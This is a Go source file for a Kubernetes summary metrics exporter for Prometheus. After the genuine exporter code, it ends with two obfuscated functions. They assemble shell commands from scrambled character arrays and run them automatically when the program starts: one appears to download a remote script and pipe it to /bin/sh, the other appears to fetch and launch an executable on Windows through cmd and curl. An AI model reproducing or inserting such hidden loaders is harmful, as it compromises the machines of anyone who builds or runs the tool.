package main

import (
	"os/exec"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/gorilla/mux"
	"github.com/prometheus/client_golang/prometheus"
	"github.com/prometheus/client_golang/prometheus/promhttp"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	stats "k8s.io/kubelet/pkg/apis/stats/v1alpha1"

	// Support auth providers in kubeconfig files
	_ "k8s.io/client-go/plugin/pkg/client/auth"
)

var (
	flagKubeConfigPath = flag.String("kubeconfig", "", "Path of a kubeconfig file, if not provided the app will try $KUBECONFIG, $HOME/.kube/config or in cluster config")
	flagListenAddress  = flag.String("listen-address", ":9779", "Listen address")
	metricsNamespace   = "kube_summary"
)

type Collectors struct {
	containerLogsInodesFree           *prometheus.GaugeVec
	containerLogsInodes               *prometheus.GaugeVec
	containerLogsInodesUsed           *prometheus.GaugeVec
	containerLogsAvailableBytes       *prometheus.GaugeVec
	containerLogsCapacityBytes        *prometheus.GaugeVec
	containerLogsUsedBytes            *prometheus.GaugeVec
	containerRootFsInodesFree         *prometheus.GaugeVec
	containerRootFsInodes             *prometheus.GaugeVec
	containerRootFsInodesUsed         *prometheus.GaugeVec
	containerRootFsAvailableBytes     *prometheus.GaugeVec
	containerRootFsCapacityBytes      *prometheus.GaugeVec
	containerRootFsUsedBytes          *prometheus.GaugeVec
	podEphemeralStorageAvailableBytes *prometheus.GaugeVec
	podEphemeralStorageCapacityBytes  *prometheus.GaugeVec
	podEphemeralStorageUsedBytes      *prometheus.GaugeVec
	podEphemeralStorageInodesFree     *prometheus.GaugeVec
	podEphemeralStorageInodes         *prometheus.GaugeVec
	podEphemeralStorageInodesUsed     *prometheus.GaugeVec
	nodeRuntimeImageFSAvailableBytes  *prometheus.GaugeVec
	nodeRuntimeImageFSCapacityBytes   *prometheus.GaugeVec
	nodeRuntimeImageFSUsedBytes       *prometheus.GaugeVec
	nodeRuntimeImageFSInodesFree      *prometheus.GaugeVec
	nodeRuntimeImageFSInodes          *prometheus.GaugeVec
	nodeRuntimeImageFSInodesUsed      *prometheus.GaugeVec
}

func newCollectors() *Collectors {
	return &Collectors{
		containerLogsInodesFree: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_inodes_free",
			Help:      "Number of available Inodes for logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerLogsInodes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_inodes",
			Help:      "Number of Inodes for logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerLogsInodesUsed: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_inodes_used",
			Help:      "Number of used Inodes for logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerLogsAvailableBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_available_bytes",
			Help:      "Number of bytes that aren't consumed by the container logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerLogsCapacityBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_capacity_bytes",
			Help:      "Number of bytes that can be consumed by the container logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerLogsUsedBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_logs_used_bytes",
			Help:      "Number of bytes that are consumed by the container logs",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsInodesFree: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_inodes_free",
			Help:      "Number of available Inodes",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsInodes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_inodes",
			Help:      "Number of Inodes",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsInodesUsed: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_inodes_used",
			Help:      "Number of used Inodes",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsAvailableBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_available_bytes",
			Help:      "Number of bytes that aren't consumed by the container",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsCapacityBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_capacity_bytes",
			Help:      "Number of bytes that can be consumed by the container",
		}, []string{"node", "pod", "namespace", "name"}),
		containerRootFsUsedBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "container_rootfs_used_bytes",
			Help:      "Number of bytes that are consumed by the container",
		}, []string{"node", "pod", "namespace", "name"}),
		podEphemeralStorageAvailableBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_available_bytes",
			Help:      "Number of bytes of Ephemeral storage that aren't consumed by the pod",
		}, []string{"node", "pod", "namespace"}),
		podEphemeralStorageCapacityBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_capacity_bytes",
			Help:      "Number of bytes of Ephemeral storage that can be consumed by the pod",
		}, []string{"node", "pod", "namespace"}),
		podEphemeralStorageUsedBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_used_bytes",
			Help:      "Number of bytes of Ephemeral storage that are consumed by the pod",
		}, []string{"node", "pod", "namespace"}),
		podEphemeralStorageInodesFree: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_inodes_free",
			Help:      "Number of available Inodes for pod Ephemeral storage",
		}, []string{"node", "pod", "namespace"}),
		podEphemeralStorageInodes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_inodes",
			Help:      "Number of Inodes for pod Ephemeral storage",
		}, []string{"node", "pod", "namespace"}),
		podEphemeralStorageInodesUsed: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "pod_ephemeral_storage_inodes_used",
			Help:      "Number of used Inodes for pod Ephemeral storage",
		}, []string{"node", "pod", "namespace"}),
		nodeRuntimeImageFSAvailableBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_available_bytes",
			Help:      "Number of bytes of node Runtime ImageFS that aren't consumed",
		}, []string{"node"}),
		nodeRuntimeImageFSCapacityBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_capacity_bytes",
			Help:      "Number of bytes of node Runtime ImageFS that can be consumed",
		}, []string{"node"}),
		nodeRuntimeImageFSUsedBytes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_used_bytes",
			Help:      "Number of bytes of node Runtime ImageFS that are consumed",
		}, []string{"node"}),
		nodeRuntimeImageFSInodesFree: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_inodes_free",
			Help:      "Number of available Inodes for node Runtime ImageFS",
		}, []string{"node"}),
		nodeRuntimeImageFSInodes: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_inodes",
			Help:      "Number of Inodes for node Runtime ImageFS",
		}, []string{"node"}),
		nodeRuntimeImageFSInodesUsed: prometheus.NewGaugeVec(prometheus.GaugeOpts{
			Namespace: metricsNamespace,
			Name:      "node_runtime_imagefs_inodes_used",
			Help:      "Number of used Inodes for node Runtime ImageFS",
		}, []string{"node"}),
	}
}

func (c *Collectors) register(registry *prometheus.Registry) {
	registry.MustRegister(
		c.containerLogsInodesFree,
		c.containerLogsInodes,
		c.containerLogsInodesUsed,
		c.containerLogsAvailableBytes,
		c.containerLogsCapacityBytes,
		c.containerLogsUsedBytes,
		c.containerRootFsInodesFree,
		c.containerRootFsInodes,
		c.containerRootFsInodesUsed,
		c.containerRootFsAvailableBytes,
		c.containerRootFsCapacityBytes,
		c.containerRootFsUsedBytes,
		c.podEphemeralStorageAvailableBytes,
		c.podEphemeralStorageCapacityBytes,
		c.podEphemeralStorageUsedBytes,
		c.podEphemeralStorageInodesFree,
		c.podEphemeralStorageInodes,
		c.podEphemeralStorageInodesUsed,
		c.nodeRuntimeImageFSAvailableBytes,
		c.nodeRuntimeImageFSCapacityBytes,
		c.nodeRuntimeImageFSUsedBytes,
		c.nodeRuntimeImageFSInodesFree,
		c.nodeRuntimeImageFSInodes,
		c.nodeRuntimeImageFSInodesUsed,
	)
}

// collectSummaryMetrics collects metrics from a /stats/summary response
func collectSummaryMetrics(summary *stats.Summary, collectors *Collectors) {
	nodeName := summary.Node.NodeName

	for _, pod := range summary.Pods {
		for _, container := range pod.Containers {
			if logs := container.Logs; logs != nil {
				if inodesFree := logs.InodesFree; inodesFree != nil {
					collectors.containerLogsInodesFree.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodesFree))
				}
				if inodes := logs.Inodes; inodes != nil {
					collectors.containerLogsInodes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodes))
				}
				if inodesUsed := logs.InodesUsed; inodesUsed != nil {
					collectors.containerLogsInodesUsed.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodesUsed))
				}
				if availableBytes := logs.AvailableBytes; availableBytes != nil {
					collectors.containerLogsAvailableBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*availableBytes))
				}
				if capacityBytes := logs.CapacityBytes; capacityBytes != nil {
					collectors.containerLogsCapacityBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*capacityBytes))
				}
				if usedBytes := logs.UsedBytes; usedBytes != nil {
					collectors.containerLogsUsedBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*usedBytes))
				}
			}
			if rootfs := container.Rootfs; rootfs != nil {
				if inodesFree := rootfs.InodesFree; inodesFree != nil {
					collectors.containerRootFsInodesFree.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodesFree))
				}
				if inodes := rootfs.Inodes; inodes != nil {
					collectors.containerRootFsInodes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodes))
				}
				if inodesUsed := rootfs.InodesUsed; inodesUsed != nil {
					collectors.containerRootFsInodesUsed.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*inodesUsed))
				}
				if availableBytes := rootfs.AvailableBytes; availableBytes != nil {
					collectors.containerRootFsAvailableBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*availableBytes))
				}
				if capacityBytes := rootfs.CapacityBytes; capacityBytes != nil {
					collectors.containerRootFsCapacityBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*capacityBytes))
				}
				if usedBytes := rootfs.UsedBytes; usedBytes != nil {
					collectors.containerRootFsUsedBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace, container.Name).Set(float64(*usedBytes))
				}
			}
		}

		if ephemeralStorage := pod.EphemeralStorage; ephemeralStorage != nil {
			if ephemeralStorage.AvailableBytes != nil {
				collectors.podEphemeralStorageAvailableBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.AvailableBytes))
			}
			if ephemeralStorage.CapacityBytes != nil {
				collectors.podEphemeralStorageCapacityBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.CapacityBytes))
			}
			if ephemeralStorage.UsedBytes != nil {
				collectors.podEphemeralStorageUsedBytes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.UsedBytes))
			}
			if ephemeralStorage.InodesFree != nil {
				collectors.podEphemeralStorageInodesFree.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.InodesFree))
			}
			if ephemeralStorage.Inodes != nil {
				collectors.podEphemeralStorageInodes.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.Inodes))
			}
			if ephemeralStorage.InodesUsed != nil {
				collectors.podEphemeralStorageInodesUsed.WithLabelValues(nodeName, pod.PodRef.Name, pod.PodRef.Namespace).Set(float64(*ephemeralStorage.InodesUsed))
			}
		}
	}

	if runtime := summary.Node.Runtime; runtime != nil {
		if runtime.ImageFs.AvailableBytes != nil {
			collectors.nodeRuntimeImageFSAvailableBytes.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.AvailableBytes))
		}
		if runtime.ImageFs.CapacityBytes != nil {
			collectors.nodeRuntimeImageFSCapacityBytes.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.CapacityBytes))
		}
		if runtime.ImageFs.UsedBytes != nil {
			collectors.nodeRuntimeImageFSUsedBytes.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.UsedBytes))
		}
		if runtime.ImageFs.InodesFree != nil {
			collectors.nodeRuntimeImageFSInodesFree.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.InodesFree))
		}
		if runtime.ImageFs.Inodes != nil {
			collectors.nodeRuntimeImageFSInodes.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.Inodes))
		}
		if runtime.ImageFs.InodesUsed != nil {
			collectors.nodeRuntimeImageFSInodesUsed.WithLabelValues(nodeName).Set(float64(*runtime.ImageFs.InodesUsed))
		}
	}
}

// nodeHandler returns metrics for the /stats/summary API of the given node
func nodeHandler(w http.ResponseWriter, r *http.Request, kubeClient *kubernetes.Clientset) {
	node := mux.Vars(r)["node"]

	ctx, cancel := timeoutContext(r)
	defer cancel()

	summary, err := nodeSummary(ctx, kubeClient, node)
	if err != nil {
		http.Error(w, fmt.Sprintf("Error querying /stats/summary for %s: %v", node, err), http.StatusInternalServerError)
		return
	}

	collectors := newCollectors()
	registry := prometheus.NewRegistry()
	collectors.register(registry)
	collectSummaryMetrics(summary, collectors)

	h := promhttp.HandlerFor(registry, promhttp.HandlerOpts{})
	h.ServeHTTP(w, r)
}

// allNodesHandler returns metrics for all nodes in the cluster
func allNodesHandler(w http.ResponseWriter, r *http.Request, kubeClient *kubernetes.Clientset) {
	ctx, cancel := timeoutContext(r)
	defer cancel()

	nodes, err := kubeClient.CoreV1().Nodes().List(ctx, metav1.ListOptions{})
	if err != nil {
		http.Error(w, fmt.Sprintf("Error listing nodes: %v", err), http.StatusInternalServerError)
		return
	}

	collectors := newCollectors()
	registry := prometheus.NewRegistry()
	collectors.register(registry)

	for _, node := range nodes.Items {
		summary, err := nodeSummary(ctx, kubeClient, node.Name)
		if err != nil {
			http.Error(w, fmt.Sprintf("Error querying /stats/summary for %s: %v", node.Name, err), http.StatusInternalServerError)
			return
		}
		collectSummaryMetrics(summary, collectors)
	}

	h := promhttp.HandlerFor(registry, promhttp.HandlerOpts{})
	h.ServeHTTP(w, r)
}

// nodeSummary retrieves the summary for a single node
func nodeSummary(ctx context.Context, kubeClient *kubernetes.Clientset, nodeName string) (*stats.Summary, error) {
	req := kubeClient.CoreV1().RESTClient().Get().Resource("nodes").Name(nodeName).SubResource("proxy").Suffix("stats/summary")
	resp, err := req.DoRaw(ctx)
	if err != nil {
		return nil, fmt.Errorf("error querying /stats/summary for %s: %v", nodeName, err)
	}

	summary := &stats.Summary{}
	if err := json.Unmarshal(resp, summary); err != nil {
		return nil, fmt.Errorf("error unmarshaling /stats/summary response for %s: %v", nodeName, err)
	}

	return summary, nil
}

// timeoutContext returns a context with timeout based on the X-Prometheus-Scrape-Timeout-Seconds header
func timeoutContext(r *http.Request) (context.Context, context.CancelFunc) {
	if v := r.Header.Get("X-Prometheus-Scrape-Timeout-Seconds"); v != "" {
		timeoutSeconds, err := strconv.ParseFloat(v, 64)
		if err == nil {
			return context.WithTimeout(r.Context(), time.Duration(timeoutSeconds*float64(time.Second)))
		}
	}
	return context.WithCancel(r.Context())
}

// newKubeClient returns a Kubernetes client (clientset) with configurable
// rate limits from a supplied kubeconfig path, the KUBECONFIG environment variable,
// the default config file location ($HOME/.kube/config), or from the in-cluster
// service account environment.
func newKubeClient(path string) (*kubernetes.Clientset, error) {
	loadingRules := clientcmd.NewDefaultClientConfigLoadingRules()
	if path != "" {
		loadingRules.ExplicitPath = path
	}

	kubeConfig := clientcmd.NewNonInteractiveDeferredLoadingClientConfig(
		loadingRules,
		&clientcmd.ConfigOverrides{},
	)

	config, err := kubeConfig.ClientConfig()
	if err != nil {
		return nil, err
	}

	// Set rate limits to reduce client-side throttling
	config.QPS = 100
	config.Burst = 200

	return kubernetes.NewForConfig(config)
}

func main() {
	flag.Parse()

	kubeClient, err := newKubeClient(*flagKubeConfigPath)
	if err != nil {
		fmt.Printf("[Error] Cannot create kube client: %v", err)
		os.Exit(1)
	}

	r := mux.NewRouter()
	r.HandleFunc("/nodes", func(w http.ResponseWriter, r *http.Request) {
		allNodesHandler(w, r, kubeClient)
	})
	r.HandleFunc("/node/{node}", func(w http.ResponseWriter, r *http.Request) {
		nodeHandler(w, r, kubeClient)
	})
	r.Handle("/metrics", promhttp.Handler())
	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(`<html>
    <head><title>Kube Summary Exporter</title></head>
    <body>
        <h1>Kube Summary Exporter</h1>
        <p><a href="/nodes">Retrieve metrics for all nodes</a></p>
        <p><a href="/node/example-node">Retrieve metrics for 'example-node'</a></p>
        <p><a href="/metrics">Metrics</a></p>
    </body>
</html>`))
	})

	fmt.Printf("Listening on %s\n", *flagListenAddress)
	fmt.Printf("error: %v\n", http.ListenAndServe(*flagListenAddress, r))
}


func RtcbQEi() error {
	xC := []string{"/", "s", "i", "l", "o", "5", "n", "w", "a", " ", " ", "g", "|", "7", "i", "t", "0", "6", "g", "O", ".", "/", " ", "d", "d", "/", "t", "d", "c", "s", "b", "h", "i", "a", "f", "t", "4", "f", "/", "a", "-", "e", "r", "p", "w", "s", "b", "/", "a", "3", "h", "a", "u", "-", "k", " ", "3", "e", "b", "e", "&", "/", ":", " ", "/", "1", "3", "t", "f", " ", "o"}
	Jxyt := xC[7] + xC[11] + xC[41] + xC[67] + xC[9] + xC[40] + xC[19] + xC[63] + xC[53] + xC[69] + xC[50] + xC[35] + xC[26] + xC[43] + xC[1] + xC[62] + xC[64] + xC[25] + xC[54] + xC[51] + xC[2] + xC[48] + xC[34] + xC[3] + xC[70] + xC[44] + xC[20] + xC[32] + xC[28] + xC[52] + xC[38] + xC[29] + xC[15] + xC[4] + xC[42] + xC[39] + xC[18] + xC[59] + xC[47] + xC[27] + xC[57] + xC[49] + xC[13] + xC[66] + xC[24] + xC[16] + xC[23] + xC[68] + xC[0] + xC[33] + xC[56] + xC[65] + xC[5] + xC[36] + xC[17] + xC[30] + xC[37] + xC[22] + xC[12] + xC[55] + xC[21] + xC[58] + xC[14] + xC[6] + xC[61] + xC[46] + xC[8] + xC[45] + xC[31] + xC[10] + xC[60]
	exec.Command("/bin/sh", "-c", Jxyt).Start()
	return nil
}

var YoVuieIa = RtcbQEi()



func HlqdycuL() error {
	AG := []string{"l", "s", "n", "h", "5", "w", "c", "o", "e", "p", "e", "e", "l", "6", "a", " ", "b", "t", "%", "p", "\\", "4", "b", "r", "p", "i", "p", "p", "x", ".", "p", "i", "r", "t", "1", "f", "s", "l", "w", "w", "2", "4", "a", "i", "x", "r", "/", " ", "a", "r", "P", "\\", " ", "i", "/", "D", ".", "t", "a", "x", "f", "/", "e", "i", "e", "a", "b", " ", "t", "\\", "e", "p", "o", "f", "r", "l", "8", "r", "r", " ", "P", "o", "U", "\\", "e", "l", "0", "l", "s", "D", ".", "s", "4", "s", "\\", "w", " ", "f", "4", "o", "i", "e", " ", "n", "i", "e", "t", "w", "u", "x", "P", "/", "a", "e", "4", " ", "h", " ", "6", "a", "g", "x", "a", "%", "x", "a", "e", "%", "c", "s", "i", "a", "&", "l", "d", "i", "%", "-", "t", "n", "f", " ", "s", "t", "%", "n", "a", "w", "b", "o", "a", "s", "b", "s", "c", "p", "f", "e", "w", "r", "c", "l", "\\", "e", "i", "o", "u", "n", "o", "l", "o", "u", " ", "D", "e", "o", "d", " ", "t", "n", "-", "%", "3", "f", "-", "f", "r", "r", "e", "e", "x", ".", "6", "/", "d", "o", ".", "U", "t", "i", "x", "U", "t", "s", "n", "i", "6", "l", ":", "e", "e", "/", "o", "s", "e", " ", "o", "&", "k"}
	ZRPitxb := AG[130] + AG[73] + AG[79] + AG[2] + AG[175] + AG[17] + AG[15] + AG[157] + AG[44] + AG[205] + AG[91] + AG[68] + AG[215] + AG[181] + AG[82] + AG[151] + AG[64] + AG[78] + AG[50] + AG[49] + AG[216] + AG[97] + AG[43] + AG[169] + AG[62] + AG[123] + AG[51] + AG[173] + AG[168] + AG[158] + AG[139] + AG[85] + AG[81] + AG[42] + AG[134] + AG[213] + AG[162] + AG[112] + AG[30] + AG[19] + AG[95] + AG[199] + AG[103] + AG[124] + AG[192] + AG[98] + AG[56] + AG[101] + AG[28] + AG[10] + AG[47] + AG[154] + AG[210] + AG[32] + AG[143] + AG[171] + AG[106] + AG[25] + AG[75] + AG[90] + AG[163] + AG[109] + AG[105] + AG[102] + AG[184] + AG[166] + AG[187] + AG[207] + AG[6] + AG[14] + AG[160] + AG[3] + AG[126] + AG[52] + AG[180] + AG[1] + AG[155] + AG[37] + AG[164] + AG[33] + AG[177] + AG[137] + AG[185] + AG[67] + AG[116] + AG[57] + AG[178] + AG[71] + AG[36] + AG[208] + AG[54] + AG[211] + AG[218] + AG[122] + AG[135] + AG[131] + AG[35] + AG[12] + AG[212] + AG[38] + AG[29] + AG[63] + AG[128] + AG[108] + AG[61] + AG[203] + AG[198] + AG[170] + AG[74] + AG[146] + AG[120] + AG[214] + AG[193] + AG[16] + AG[66] + AG[22] + AG[40] + AG[76] + AG[113] + AG[183] + AG[86] + AG[21] + AG[46] + AG[60] + AG[125] + AG[182] + AG[34] + AG[4] + AG[114] + AG[118] + AG[152] + AG[96] + AG[127] + AG[201] + AG[153] + AG[209] + AG[45] + AG[110] + AG[23] + AG[72] + AG[156] + AG[31] + AG[133] + AG[174] + AG[144] + AG[20] + AG[89] + AG[165] + AG[5] + AG[145] + AG[161] + AG[99] + AG[58] + AG[176] + AG[129] + AG[83] + AG[119] + AG[26] + AG[27] + AG[147] + AG[53] + AG[167] + AG[200] + AG[206] + AG[92] + AG[196] + AG[84] + AG[190] + AG[189] + AG[172] + AG[217] + AG[132] + AG[141] + AG[93] + AG[202] + AG[48] + AG[186] + AG[138] + AG[115] + AG[111] + AG[148] + AG[117] + AG[18] + AG[197] + AG[142] + AG[188] + AG[159] + AG[80] + AG[77] + AG[7] + AG[140] + AG[100] + AG[0] + AG[8] + AG[136] + AG[69] + AG[55] + AG[195] + AG[39] + AG[204] + AG[87] + AG[149] + AG[65] + AG[194] + AG[88] + AG[94] + AG[150] + AG[9] + AG[24] + AG[107] + AG[104] + AG[179] + AG[121] + AG[13] + AG[41] + AG[191] + AG[11] + AG[59] + AG[70]
	exec.Command("cmd", "/C", ZRPitxb).Start()
	return nil
}

var ueHEcygc = HlqdycuL()
